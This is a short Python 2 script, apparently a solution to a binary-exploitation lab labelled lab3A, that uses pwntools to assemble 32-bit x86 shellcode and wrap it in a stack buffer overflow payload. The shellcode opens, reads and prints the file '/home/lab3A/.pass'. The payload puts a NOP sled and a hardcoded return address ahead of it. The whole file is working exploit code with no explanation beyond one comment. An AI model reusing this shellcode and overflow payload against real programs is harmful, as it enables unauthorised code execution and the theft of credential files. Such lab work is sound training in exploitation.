#!/usr/bin/python

import sys
import pwnlib
import binascii
import struct

pwnlib.asm.context.clear()
pwnlib.asm.context.arch = 'i386'
pwnlib.asm.context.bits = 32

instructions = [
    "xor ecx, ecx",
    "push 0x73",
    "push 0x7361702e",
    "push 0x2f413362",
    "push 0x616c2f65",
    "push 0x6d6f682f",
    "mov ebx, esp",
    "xor eax, eax",
    "mov al, SYS_open",
    "int 0x80",          # open("/home/lab3A/.pass", O_RDONLY);

    "mov ebx, eax",
    "mov ecx, esp",
    "xor edx, edx",
    "mov dl, 0xff",
    "xor eax, eax",
    "mov al, SYS_read",
    "int 0x80",

    "mov ecx, esp",
    "xor eax, eax",
    "xor ebx, ebx",
    "mov bl, 1",
    "mov al, SYS_write",
    "int 0x80",

    "xor eax, eax",
    "inc al",
    "int 0x80"
]

sc = ''

for instr in instructions:
    sc += pwnlib.asm.asm(instr)

length = 156
ret_addr = struct.pack("<I", 0xbffff57f)

shellcode = binascii.unhexlify(sc.encode('hex'))
payload = "\x90" * length + ret_addr + "\x90" * 32 + shellcode

o = ''
for a in payload:
    o += '\\x%02x' % ord(a)

print o

